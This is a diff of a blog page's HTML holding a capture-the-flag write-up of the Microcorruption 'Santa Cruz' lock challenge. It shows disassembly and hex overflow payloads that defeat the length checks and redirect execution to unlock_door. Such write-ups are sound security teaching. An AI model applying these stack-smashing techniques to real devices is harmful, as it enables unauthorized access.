@@ -1,36 +1,13 @@
-<!doctype html><html lang=en>
-<head>
-<title>
-microcorruption - santa cruz ::
-#!/bin/note
-— a checkbox uncheckers notepad
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>microcorruption - santa cruz | #!/bin/note
 </title>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content=" This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Johannesburg. This challenge is titled Santa Cruz.
-The challenge has the following description when you start:
- This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.
- Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.
-">
-<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
-<meta name=robots content="noodp">
-<link rel=canonical href=https://leonjza.github.io/blog/2018/03/11/microcorruption-santa-cruz/>
-<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
-<link rel=stylesheet href=https://leonjza.github.io/style.css>
-<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
-<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="microcorruption - santa cruz">
-<meta name=twitter:description content="
-    
-    
-  
+<meta name=keywords content>
+<meta name=description content="
+     
 
 
 This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Johannesburg. This challenge is titled Santa Cruz.
@@ -39,11 +16,25 @@ The challenge has the following description when you start:
 This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.
 
 Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.">
-<meta property="og:title" content="microcorruption - santa cruz">
+<meta name=author content="Leon Jacobs">
+<link rel=canonical href=https://leonjza.github.io/blog/2018/03/11/microcorruption-santa-cruz/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://leonjza.github.io/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
+<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.88.1">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="microcorruption - santa cruz">
 <meta property="og:description" content="
-    
-    
-  
+     
 
 
 This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Johannesburg. This challenge is titled Santa Cruz.
@@ -57,66 +48,89 @@ Maybe we are finally done with the overflow problems? This challenge took me qui
 <meta property="article:published_time" content="2018-03-11T20:23:43+02:00">
 <meta property="article:modified_time" content="2018-03-11T20:23:43+02:00"><meta property="og:site_name" content="#!/bin/note
 ">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="microcorruption - santa cruz">
+<meta name=twitter:description content="
+     
+
+
+This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Johannesburg. This challenge is titled Santa Cruz.
+The challenge has the following description when you start:
+
+This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.
+
+Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"microcorruption - santa cruz","item":"https://leonjza.github.io/blog/2018/03/11/microcorruption-santa-cruz/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"microcorruption - santa cruz","name":"microcorruption - santa cruz","description":"  This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Johannesburg. This challenge is titled Santa Cruz.\nThe challenge has the following description when you start:\n This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.\n Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.\n","keywords":[],"articleBody":"  This post is part of the series of solving microcorruption.com ctf challenges which continues from the previous challenge called Johannesburg. This challenge is titled Santa Cruz.\nThe challenge has the following description when you start:\n This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.\n Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.\nsanta cruz Static analysis of the programs' code showed that we are calling login from main again, after adjusting the stack pointer.\n4438 main 4438: 3150 ceff add #0xffce, sp 443c: b012 5045 call #0x4550  Nothing too interesting. However, login was much larger when compared to previous versions we have seen. Once I finished skimming through login, I noticed that this program contained a number of methods that don’t seem to be called at all. For example, test_username_and_password_valid, putchar and getchar.\nIt quickly became evident that most of the important logic was within login. As previously mentioned, this routine was quite large, so lets take a closer look at it in smaller chunks.\n4550 login 4550: 0b12 push r11 4552: 0412 push r4 4554: 0441 mov sp, r4 4556: 2452 add #0x4, r4 4558: 3150 d8ff add #0xffd8, sp 455c: c443 faff mov.b #0x0, -0x6(r4) 4560: f442 e7ff mov.b #0x8, -0x19(r4) 4564: f440 1000 e8ff mov.b #0x10, -0x18(r4) The beginning of login contained three interesting instructions to move the bytes 0x0, 0x8 and 0x10 into very specific locations within memory. This caught my eye pretty quickly and they are important so keep them in mind.\n456a: 3f40 8444 mov #0x4484 \"Authentication now requires a username and password.\", r15 456e: b012 2847 call #0x4728  4572: 3f40 b944 mov #0x44b9 \"Remember: both are between 8 and 16 characters.\", r15 4576: b012 2847 call #0x4728  This section is pretty vanilla. It simply prints out some strings. Notice though the fact that both the username and password is supposed to be between 8 (0x8) and 16 (0x10) characters.\n457a: 3f40 e944 mov #0x44e9 \"Please enter your username:\", r15 457e: b012 2847 call #0x4728  4582: 3e40 6300 mov #0x63, r14 4586: 3f40 0424 mov #0x2404, r15 458a: b012 1847 call #0x4718  458e: 3f40 0424 mov #0x2404, r15 4592: b012 2847 call #0x4728  4596: 3e40 0424 mov #0x2404, r14 459a: 0f44 mov r4, r15 459c: 3f50 d6ff add #0xffd6, r15 45a0: b012 5447 call #0x4754   45a4: 3f40 0545 mov #0x4505 \"Please enter your password:\", r15 45a8: b012 2847 call #0x4728  45ac: 3e40 6300 mov #0x63, r14 45b0: 3f40 0424 mov #0x2404, r15 45b4: b012 1847 call #0x4718  45b8: 3f40 0424 mov #0x2404, r15 45bc: b012 2847 call #0x4728  45c0: 0b44 mov r4, r11 45c2: 3b50 e9ff add #0xffe9, r11 45c6: 3e40 0424 mov #0x2404, r14 45ca: 0f4b mov r11, r15 45cc: b012 5447 call #0x4754  Much like the previous challenge, this section simply gets the username and password from the user. Once a value has been captured, strcpy is called to move the data to another section in memory after echoing it back to the user.\n45d0: 0f4b mov r11, r15 45d2: 0e44 mov r4, r14 45d4: 3e50 e8ff add #0xffe8, r14 45d8: 1e53 inc r14 45da: ce93 0000 tst.b 0x0(r14) 45de: fc23 jnz #0x45d8   ; the loop is done 45e0: 0b4e mov r14, r11 45e2: 0b8f sub r15, r11 45e4: 5f44 e8ff mov.b -0x18(r4), r15 45e8: 8f11 sxt r15 45ea: 0b9f cmp r15, r11 45ec: 0628 jnc #0x45fa  45ee: 1f42 0024 mov \u00260x2400, r15 45f2: b012 2847 call #0x4728  45f6: 3040 4044 br #0x4440  This section seems to have a loop, incrementing r14 until the byte at the memory location pointed to by r14 is 0x0. A length counter maybe? After the loop, the byte at -0x18(r4) (which is set to 0x10 at the start of the login routine remember?) is compared to that which is in r15. Depending on the outcome of the cmp at 0x45ea, the program may be stopped. I guess this is the overflow protection implemented.\n45fa: 5f44 e7ff mov.b -0x19(r4), r15 45fe: 8f11 sxt r15 4600: 0b9f cmp r15, r11 4602: 062c jc #0x4610  4604: 1f42 0224 mov \u00260x2402, r15 4608: b012 2847 call #0x4728  460c: 3040 4044 br #0x4440  Similarly, another cmp is done with the value at -0x19(r4) (which was set to 0x8 at the beginning of login) with a similar abrupt stop if it fails. This is most likely the lower bounds checking.\n4610: c443 d4ff mov.b #0x0, -0x2c(r4) 4614: 3f40 d4ff mov #0xffd4, r15 4618: 0f54 add r4, r15 461a: 0f12 push r15 461c: 0f44 mov r4, r15 461e: 3f50 e9ff add #0xffe9, r15 4622: 0f12 push r15 4624: 3f50 edff add #0xffed, r15 4628: 0f12 push r15 462a: 3012 7d00 push #0x7d 462e: b012 c446 call #0x46c4  4632: 3152 add #0x8, sp 4634: c493 d4ff tst.b -0x2c(r4) 4638: 0524 jz #0x4644  463a: b012 4a44 call #0x444a  463e: 3f40 2145 mov #0x4521 \"Access granted.\", r15 4642: 023c jmp #0x4648  4644: 3f40 3145 mov #0x4531 \"That password is not correct.\", r15 4648: b012 2847 call #0x4728  For this next section, it looks like the stack is being setup for syscall 0x7d to be called. Depending on the result, unlock_door would be called or a message would simply be printed saying that the password was incorrect.\n464c: c493 faff tst.b -0x6(r4) 4650: 0624 jz #0x465e  4652: 1f42 0024 mov \u00260x2400, r15 4656: b012 2847 call #0x4728  465a: 3040 4044 br #0x4440  465e: 3150 2800 add #0x28, sp 4662: 3441 pop r4 4664: 3b41 pop r11 4666: 3041 ret Before we leave the routine, a final check is done with tst.b -0x6(r4). If the value at the memory address at this time is zero, the function would return as normal (based on the jz instruction), otherwise, another abrupt stop would occur.\nFrom the static analysis we can see that three distinct checks are being done. An upper and lower bounds check and an arbitrary null byte check. Time to fuzz the inputs and see how that works out.\ndebugging Now the very first thing I did here was supply inputs that were longer than the prescribed 16 bytes. A 20 byte username and 20 byte password promptly failed and caused the program to print a “password too short” message and end.\n  Erm. Wat. I expected the password too long message, not too short? Alright. I figured what would be a better approach would be to first have a look at what a valid run through looks like. Primarily this was to get an idea of what the memory layout looks like when the bounds checks we have identified are being done. I set a breakpoint at 0x45d0 right after the second strcpy call so that I could see what the memory layout would be together with inputs that were 10 bytes long (aka: within the size limits).\n  There are a number of observations to make here. The username buffer (which I provided as 10 41’s) is padded with zeros up to 0x43b3, and the password buffer (which I provided as 10 42’s) is padded with zeros up to 0x43cc. At 0x43cc we have 0x4440, which is the start of the __stop_progExec__ routine. Between the username and password buffers are the two bytes that were set very early in the login routine.\nFinally, given the first attempt to just provide inputs that were clearly too long, we smashed the 0x8 and 0x10 values, meaning we control those values!\nStepping through the rest of login one can see the bytes 0x8 and 0x10 are used within the bounds checks. This does however seem to only be the case for the password field.\n  As a final test, I provided a username of 50 44’s and a password of 9 41’s. The username overrode the two bytes used for bounds checking, as well as the suspected return address for login. The password however was placed at a static offset at 0x43b4 and terminated with a null byte inside of the username buffer.\nIt seemed clear at this stage that all I would need to do was set my own values for the password buffer lengths and corrupt the memory past the return address, redirecting the code flow to something like unlock_door.\nGiven that the bytes used for bounds checking was at offsets 18 and 19 from where the password buffer started, I chose to place the values 0x1 and 0x99 as the new min/max values. I then continued to overflow the buffer, hoping to replace the address login would return to to 0x4242 to test if I can reach it.\npython -c \"print('41' * 17 + '0199' + 30 * '42')\" 41414141414141414141414141414141410199424242424242424242424242424242424242424242424242424242424242 With my username payload ready, I simply provided two bytes for the password as 4343.\n  This time round, I passed the two bounds checks that occur between 0x45ec and 0x460c. The HSM did not validate the password I provided (no surprise there), but after the That password is not correct., another Invalid Password Length: password too long. message was printed. This has to be as a result of that tst.b -0x6(r4) call towards the end of login.\nSetting a breakpoint at 0x464c, I inspected the memory contents that was being tested. For reference, lets have one more look at the end of the login routine as well:\n464c: c493 faff tst.b -0x6(r4) 4650: 0624 jz #0x465e  4652: 1f42 0024 mov \u00260x2400, r15 4656: b012 2847 call #0x4728  465a: 3040 4044 br #0x4440  465e: 3150 2800 add #0x28, sp 4662: 3441 pop r4 4664: 3b41 pop r11 4666: 3041 ret In order for us to take the jump at 0x4650 to 0x465e (bypassing the abrupt stop), we need to have the byte at -0x6(r4) be null.\n  Running the program with our 4343 payload as the password, we can see we have a 42 at 0x43c6 (which is 0x43cc - 0x6). We know that the end of our username and password buffers have null bytes in memory, so we could use that to get this final null byte written for the check to pass.\nWe two options here. We could use the username field to overflow up to where the null byte should be written, and then provide the rest of the payload as the password field as one option. We could also use the password field to simply pad up to the null byte field and have that written there, keeping our primary payload in the username field. I opted for the latter. Inspecting the memory layout, one can see that the null byte should be at offset 18 from the start of the password buffer.\nGenerating the username payload was now done as follows:\n$ python -c \"print('41' * 17 + '0199' + '44' * 30)\" 41414141414141414141414141414141430199444444444444444444444444444444444444444444444444444444444444 The password payload on the other hand was (with an expectation of a nullbyte at pos 18):\n$ python -c \"print('42' * 17)\" 4242424242424242424242424242424242   Woohoo! The byte at 0x43c6 is now 0x0, bypassing the check. If we were to continue execution at this point, we would end up at invalid instructions and a message such as insn address unaligned within the debugger. This is good news!\nThe only thing that is left for us to do is to set the address to jump to when login returns. This was at offset 23 from the username buffer. A routine called unlock_door started at 0x444a (so 4a44 for endianness) which called the correct interrupt to unlock the lock. So, keeping our password field as is, we generate the username with:\n$ python -c \"print('41' * 17 + '0199' + '44' * 23 + '4a44')\" 4141414141414141414141414141414141019944444444444444444444444444444444444444444444444a44   solution Enter 41414141414141414141414141414141430199444444444444444444444444444444444444444444444444444444444444 as hex encoded input for the username and 4242424242424242424242424242424242 as hex encoded input for the password.\nother challenges For my other write ups in the microcorruption series, checkout this link.\n","wordCount":"2015","inLanguage":"en","datePublished":"2018-03-11T20:23:43+02:00","dateModified":"2018-03-11T20:23:43+02:00","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2018/03/11/microcorruption-santa-cruz/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
 </head>
-<body class=dark-theme>
-<div class=container>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
 <header class=header>
-<span class=header__inner>
-<a href=/ class=logo style=text-decoration:none>
-<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
-</span>
-<span class=logo__text>#!/bin/note
-</span>
-<span class=logo__cursor></span>
+<nav class=nav>
+<div class=logo>
+<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
+ (Alt + H)">#!/bin/note
 </a>
-<span class=header__right>
-<nav class=menu>
-<ul class="menu__inner menu__inner--desktop">
-<li><a href=/about/>About Me</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
-</ul>
-<ul class="menu__inner menu__inner--mobile">
-<li><a href=/about/>About Me</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://leonjza.github.io/about/ title="About Me">
+<span>About Me</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/archives title=Archive>
+<span>Archive</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/categories title=Categories>
+<span>Categories</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
 </ul>
 </nav>
-<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-</span>
-<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
-</span>
-</span>
-</span>
 </header>
-<div class=content>
-<div class=post>
-<h1 class=post-title>microcorruption - santa cruz</h1>
-<div class=post-meta>
-<span class=post-date>
-2018-03-11
-</span>
-<span class=post-read-time>— 10 min read</span>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
+<h1 class=post-title>
+microcorruption - santa cruz
+</h1>
+<div class=post-meta>March 11, 2018&nbsp;·&nbsp;10 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2018-03-11-microcorruption---santa-cruz.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
 </div>
-<div class=post-content>
-<h2>Table of Contents</h2>
-<aside class=table-of-contents><nav id=TableOfContents>
-<ul>
+</header> <div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
 <li>
-<ul>
-<li><a href=#santa-cruz>santa cruz</a>
-<ul>
-<li><a href=#debugging>debugging</a></li>
-</ul>
+<a href=#santa-cruz aria-label="santa cruz">santa cruz</a><ul>
+<li>
+<a href=#debugging aria-label=debugging>debugging</a></li></ul>
 </li>
-<li><a href=#solution>solution</a></li>
-<li><a href=#other-challenges>other challenges</a></li>
-</ul>
+<li>
+<a href=#solution aria-label=solution>solution</a></li>
+<li>
+<a href=#other-challenges aria-label="other challenges">other challenges</a>
 </li>
 </ul>
-</nav></aside>
-<figure class=left>
-<img src=/images/microcorruption/microcorruption.png>
+</div>
+</details>
+</div>
+<div class=post-content><figure>
+<img loading=lazy src=/images/microcorruption/microcorruption.png>
 </figure>
 <p>This post is part of the series of solving <a href=https://microcorruption.com>microcorruption.com</a> ctf challenges which continues from the <a href=https://leonjza.github.io/blog/2018/03/09/microcorruption---johannesburg/>previous challenge</a> called <em>Johannesburg</em>. This challenge is titled <em>Santa Cruz</em>.</p>
 <p>The challenge has the following description when you start:</p>
@@ -124,7 +138,7 @@ Maybe we are finally done with the overflow problems? This challenge took me qui
 <p>This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.</p>
 </blockquote>
 <p>Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.</p>
-<h2 id=santa-cruz>santa cruz</h2>
+<h2 id=santa-cruz>santa cruz<a hidden class=anchor aria-hidden=true href=#santa-cruz>#</a></h2>
 <p>Static analysis of the programs' code showed that we are calling <code>login</code> from <code>main</code> again, after adjusting the stack pointer.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#960050;background-color:#1e0010>4438</span> <span style=color:#960050;background-color:#1e0010>&lt;</span><span style=color:#a6e22e>main</span><span style=color:#960050;background-color:#1e0010>&gt;</span>
 <span style=color:#960050;background-color:#1e0010>4438:</span>  <span style=color:#960050;background-color:#1e0010>3150</span> <span style=color:#a6e22e>ceff</span>      <span style=color:#66d9ef>add</span>   <span style=color:#75715e>#0xffce, sp
@@ -228,20 +242,20 @@ Maybe we are finally done with the overflow problems? This challenge took me qui
 <span style=color:#960050;background-color:#1e0010>4666:</span>  <span style=color:#960050;background-color:#1e0010>3041</span>           <span style=color:#a6e22e>ret</span>
 </code></pre></div><p>Before we leave the routine, a final check is done with <code>tst.b -0x6(r4)</code>. If the value at the memory address at this time is zero, the function would return as normal (based on the <code>jz</code> instruction), otherwise, another abrupt stop would occur.</p>
 <p>From the static analysis we can see that three distinct checks are being done. An upper and lower bounds check and an arbitrary null byte check. Time to fuzz the inputs and see how that works out.</p>
-<h3 id=debugging>debugging</h3>
+<h3 id=debugging>debugging<a hidden class=anchor aria-hidden=true href=#debugging>#</a></h3>
 <p>Now the very first thing I did here was supply inputs that were longer than the prescribed 16 bytes. A 20 byte username and 20 byte password promptly failed and caused the program to print a &ldquo;password too short&rdquo; message and end.</p>
-<figure class=left>
-<img src=/images/microcorruption/santa_cruz_input_fuzz1.png>
+<figure>
+<img loading=lazy src=/images/microcorruption/santa_cruz_input_fuzz1.png>
 </figure>
 <p>Erm. Wat. I expected the password too long message, not too short? Alright. I figured what would be a better approach would be to first have a look at what a valid run through looks like. Primarily this was to get an idea of what the memory layout looks like when the bounds checks we have identified are being done. I set a breakpoint at <code>0x45d0</code> right after the second <code>strcpy</code> call so that I could see what the memory layout would be together with inputs that were 10 bytes long (aka: within the size limits).</p>
-<figure class=left>
-<img src=/images/microcorruption/santa_cruz_memory_layout_within_bounds.png>
+<figure>
+<img loading=lazy src=/images/microcorruption/santa_cruz_memory_layout_within_bounds.png>
 </figure>
 <p>There are a number of observations to make here. The username buffer (which I provided as 10 <code>41</code>&rsquo;s) is padded with zeros up to <code>0x43b3</code>, and the password buffer (which I provided as 10 <code>42</code>&rsquo;s) is padded with zeros up to <code>0x43cc</code>. At <code>0x43cc</code> we have <code>0x4440</code>, which is the start of the <code>__stop_progExec__</code> routine. Between the username and password buffers are the two bytes that were set very early in the <code>login</code> routine.</p>
 <p>Finally, given the first attempt to just provide inputs that were clearly too long, we smashed the <code>0x8</code> and <code>0x10</code> values, meaning we control those values!</p>
 <p>Stepping through the rest of <code>login</code> one can see the bytes <code>0x8</code> and <code>0x10</code> are used within the bounds checks. This does however seem to only be the case for the password field.</p>
-<figure class=left>
-<img src=/images/microcorruption/santa_cruz_stack_smash.png>
+<figure>
+<img loading=lazy src=/images/microcorruption/santa_cruz_stack_smash.png>
 </figure>
 <p>As a final test, I provided a username of 50 <code>44</code>&rsquo;s and a password of 9 <code>41</code>&rsquo;s. The username overrode the two bytes used for bounds checking, as well as the suspected return address for <code>login</code>. The password however was placed at a static offset at <code>0x43b4</code> and terminated with a null byte inside of the username buffer.</p>
 <p>It seemed clear at this stage that all I would need to do was set my own values for the password buffer lengths and corrupt the memory past the return address, redirecting the code flow to something like <code>unlock_door</code>.</p>
@@ -249,8 +263,8 @@ Maybe we are finally done with the overflow problems? This challenge took me qui
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;print(&#39;41&#39; * 17 + &#39;0199&#39; + 30 * &#39;42&#39;)&#34;</span>
 <span style=color:#ae81ff>41414141414141414141414141414141410199424242424242424242424242424242424242424242424242424242424242</span>
 </code></pre></div><p>With my username payload ready, I simply provided two bytes for the password as <code>4343</code>.</p>
-<figure class=left>
-<img src=/images/microcorruption/santa_cruz_payload_1.png>
+<figure>
+<img loading=lazy src=/images/microcorruption/santa_cruz_payload_1.png>
 </figure>
 <p>This time round, I passed the two bounds checks that occur between <code>0x45ec</code> and <code>0x460c</code>. The HSM did not validate the password I provided (no surprise there), but after the <code>That password is not correct.</code>, another <code>Invalid Password Length: password too long.</code> message was printed. This has to be as a result of that <code>tst.b -0x6(r4)</code> call towards the end of <code>login</code>.</p>
 <p>Setting a breakpoint at <code>0x464c</code>, I inspected the memory contents that was being tested. For reference, lets have one more look at the end of the <code>login</code> routine as well:</p>
@@ -264,8 +278,8 @@ Maybe we are finally done with the overflow problems? This challenge took me qui
 <span style=color:#960050;background-color:#1e0010>4664:</span>  <span style=color:#960050;background-color:#1e0010>3</span><span style=color:#a6e22e>b41</span>           <span style=color:#66d9ef>pop</span>   <span style=color:#66d9ef>r11</span>
 <span style=color:#960050;background-color:#1e0010>4666:</span>  <span style=color:#960050;background-color:#1e0010>3041</span>           <span style=color:#a6e22e>ret</span>
 </code></pre></div><p>In order for us to take the jump at <code>0x4650</code> to <code>0x465e</code> (bypassing the abrupt stop), we need to have the byte at <code>-0x6(r4)</code> be null.</p>
-<figure class=left>
-<img src=/images/microcorruption/santa_cruz_null_byte_check.png>
+<figure>
+<img loading=lazy src=/images/microcorruption/santa_cruz_null_byte_check.png>
 </figure>
 <p>Running the program with our <code>4343</code> payload as the password, we can see we have a <code>42</code> at <code>0x43c6</code> (which is <code>0x43cc</code> - <code>0x6</code>). We know that the end of our username and password buffers have null bytes in memory, so we could use that to get this final null byte written for the check to pass.</p>
 <p>We two options here. We could use the username field to overflow up to where the null byte should be written, and then provide the rest of the payload as the password field as one option. We could also use the password field to simply pad up to the null byte field and have that written there, keeping our primary payload in the username field. I opted for the latter. Inspecting the memory layout, one can see that the null byte should be at offset 18 from the start of the password buffer.</p>
@@ -275,53 +289,64 @@ Maybe we are finally done with the overflow problems? This challenge took me qui
 </code></pre></div><p>The password payload on the other hand was (with an expectation of a nullbyte at pos 18):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>$</span> python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;print(&#39;42&#39; * 17)&#34;</span>
 <span style=color:#ae81ff>4242424242424242424242424242424242</span>
-</code></pre></div>
-<figure class=left>
-<img src=/images/microcorruption/santa_cruz_null_byte_check.png>
+</code></pre></div><figure>
+<img loading=lazy src=/images/microcorruption/santa_cruz_null_byte_check.png>
 </figure>
 <p>Woohoo! The byte at <code>0x43c6</code> is now <code>0x0</code>, bypassing the check. If we were to continue execution at this point, we would end up at invalid instructions and a message such as <code>insn address unaligned</code> within the debugger. This is good news!</p>
 <p>The only thing that is left for us to do is to set the address to jump to when <code>login</code> returns. This was at offset 23 from the username buffer. A routine called <code>unlock_door</code> started at <code>0x444a</code> (so <code>4a44</code> for endianness) which called the correct interrupt to unlock the lock. So, keeping our password field as is, we generate the username with:</p>
